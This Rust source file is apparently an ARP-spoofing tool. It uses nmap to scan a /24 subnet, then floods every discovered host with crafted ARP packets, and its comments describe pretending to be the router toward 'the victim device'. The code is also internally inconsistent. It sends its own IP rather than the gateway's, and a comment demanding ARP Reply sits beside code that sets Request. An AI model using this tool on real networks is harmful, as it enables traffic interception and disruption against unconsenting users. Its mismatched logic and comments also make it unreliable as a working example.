use clap::Parser;
use pnet::datalink::{self, Config, NetworkInterface, interfaces};
use pnet::packet::MutablePacket;
use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, MutableArpPacket};
use pnet::packet::ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket};
use pnet::util::MacAddr;
use std::hint::spin_loop;
use std::io::Write;
use std::net::{IpAddr, Ipv4Addr};
use std::process::Command;
use std::time::Duration;

use libc::{CPU_SET, CPU_ZERO, cpu_set_t, sched_setaffinity};
use std::sync::OnceLock;
use std::thread::{sleep, spawn};
use std::{io, mem};

#[derive(Parser, Clone)]
#[command(version, about, long_about = None)]
pub struct Args {
    #[arg(short, long, default_value_t = 100)]
    pub sleep: u64,
    #[arg(short, long, default_value_t = 1)]
    pub thread: u64,
    #[arg(short, long, default_value = "192.168.1.1")]
    pub gateway: String,
}

fn main() {
    let args = parse_args();
    let all_ips = get_all_ips(&args);
    println!("targeted to all ip: {:?}", all_ips);
    let _ = ALL_IPS.set(all_ips);
    let args = Box::new(args);
    send_l2_packets(Box::leak(args));
}

fn parse_args() -> Args {
    Args::parse()
}

static ALL_IPS: OnceLock<Vec<Ipv4Addr>> = OnceLock::new();

fn get_active_interface(interfaces: &[NetworkInterface]) -> Option<&NetworkInterface> {
    interfaces.iter().find(|iface| {
        iface.is_up()
            && iface.mac.is_some() // Excludes loopback 'lo'
            && iface.ips.iter().any(|ip_net| {
            matches!(ip_net.ip(), IpAddr::V4(ip) if !ip.is_loopback())
        })
    })
}

fn get_all_ips(args: &Args) -> Vec<Ipv4Addr> {
    let output = Command::new("nmap")
        .args(["-sn", &format!("{}/24", args.gateway)])
        .output()
        .expect("Failed to execute nmap");

    String::from_utf8_lossy(&output.stdout)
        .lines()
        .filter(|line| line.contains("scan report for"))
        .filter_map(|line| line.split_whitespace().last())
        .filter_map(|ip| ip.parse::<Ipv4Addr>().ok())
        .filter(|&ip| ip != Ipv4Addr::new(192, 168, 1, 1))
        .collect()
}

/// return current ip and mac
fn scan_device() -> (NetworkInterface, Ipv4Addr, MacAddr) {
    // Find the network interface with the provided name
    let interfaces = interfaces();
    let active_interface = get_active_interface(&interfaces).unwrap();
    let source_ip = active_interface
        .ips
        .iter()
        .find_map(|ip_net| {
            if let IpAddr::V4(ipv4) = ip_net.ip() {
                Some(ipv4)
            } else {
                None
            }
        })
        .unwrap();
    let source_mac = active_interface.mac.unwrap();
    (active_interface.clone(), source_ip, source_mac)
}

fn set_affinity_core(core_id: usize) -> Result<(), i32> {
    unsafe {
        let mut cpuset: cpu_set_t = mem::zeroed();
        CPU_ZERO(&mut cpuset);
        CPU_SET(core_id, &mut cpuset);
        let res = sched_setaffinity(0, mem::size_of::<cpu_set_t>(), &cpuset);
        if res != 0 {
            return Err(std::io::Error::last_os_error().raw_os_error().unwrap_or(0));
        }
    }
    Ok(())
}

fn send_l2_packets(args: &'static Args) {
    let handle = spawn(move || {
        let config = Config {
            write_buffer_size: 4096,
            read_buffer_size: 4096,
            read_timeout: None,
            write_timeout: None,
            channel_type: datalink::ChannelType::Layer2,
            bpf_fd_attempts: 1000,
            linux_fanout: None,
            promiscuous: false,
            socket_fd: None,
        };

        let device = scan_device();
        let (mut tx, _rx) = match datalink::channel(&device.0, config) {
            Ok(datalink::Channel::Ethernet(tx, rx)) => (tx, rx),
            Ok(_) => panic!("Unhandled channel type"),
            Err(e) => panic!("Failed to create datalink channel: {}", e),
        };

        set_affinity_core(args.thread as usize).unwrap();
        spin_loop();

        loop {
            for target_ip in ALL_IPS.get().unwrap() {
                if target_ip == &device.1 {
                    continue;
                }
                send_arp_packet(&mut *tx, &device.0, target_ip);
            }
            sleep(Duration::from_millis(args.sleep));
        }
    });

    loop {
        if handle.is_finished() {
            break;
        }

        print!("sending l2 packet to target");
        for _ in 0..ALL_IPS.get().unwrap().len() {
            print!(".");
            io::stdout().flush().unwrap();
            sleep(Duration::from_millis(500));
        }
        println!();
    }

    // Consume the handle after the loop exits
    match handle.join() {
        Ok(_) => println!("Thread exited normally"),
        Err(e) => {
            let msg = e
                .downcast_ref::<String>()
                .map(|s| s.as_str())
                .or_else(|| e.downcast_ref::<&str>().copied())
                .unwrap_or("Unknown panic payload");
            eprintln!("Thread panicked: {}", msg);
        }
    }
}

/// Send an ARP request packet
fn send_arp_packet(
    tx: &mut dyn pnet::datalink::DataLinkSender,
    interface: &NetworkInterface,
    target_ip: &Ipv4Addr,
) {
    let source_mac = interface.mac.unwrap_or_else(|| {
        println!("Interface has no MAC address");
        MacAddr::new(0, 0, 0, 0, 0, 0)
    });

    let source_ip = interface
        .ips
        .iter()
        .find_map(|ip_net| {
            if let IpAddr::V4(ipv4) = ip_net.ip() {
                Some(ipv4)
            } else {
                None
            }
        })
        .unwrap_or_else(|| Ipv4Addr::new(192, 168, 1, 100));

    let ethernet_size = EthernetPacket::minimum_packet_size();
    let arp_size = MutableArpPacket::minimum_packet_size();
    let total_size = ethernet_size + arp_size;

    tx.build_and_send(1, total_size, &mut |packet| {
        build_arp_spoof(packet, source_mac, target_ip, source_ip)
    });
}

fn build_arp_spoof(packet: &mut [u8], my_mac: MacAddr, target_ip: &Ipv4Addr, gateway_ip: Ipv4Addr) {
    let mut ethernet_packet = MutableEthernetPacket::new(packet).unwrap();

    // Send directly to the target's MAC (if known) or broadcast
    ethernet_packet.set_destination(MacAddr::broadcast());
    ethernet_packet.set_source(my_mac);
    ethernet_packet.set_ethertype(EtherTypes::Arp);

    let mut arp_packet = MutableArpPacket::new(ethernet_packet.payload_mut()).unwrap();
    arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
    arp_packet.set_protocol_type(EtherTypes::Ipv4);
    arp_packet.set_hw_addr_len(6);
    arp_packet.set_proto_addr_len(4);

    // CRITICAL: Use Reply (2) instead of Request (1)
    arp_packet.set_operation(ArpOperations::Request);

    // Sender: You (claiming to be the Gateway)
    arp_packet.set_sender_hw_addr(my_mac);
    arp_packet.set_sender_proto_addr(gateway_ip); // Pretending to be the router

    // Target: The victim device
    arp_packet.set_target_hw_addr(MacAddr::new(0, 0, 0, 0, 0, 0)); // Usually ignored in unsolicited replies
    arp_packet.set_target_proto_addr(*target_ip);
}
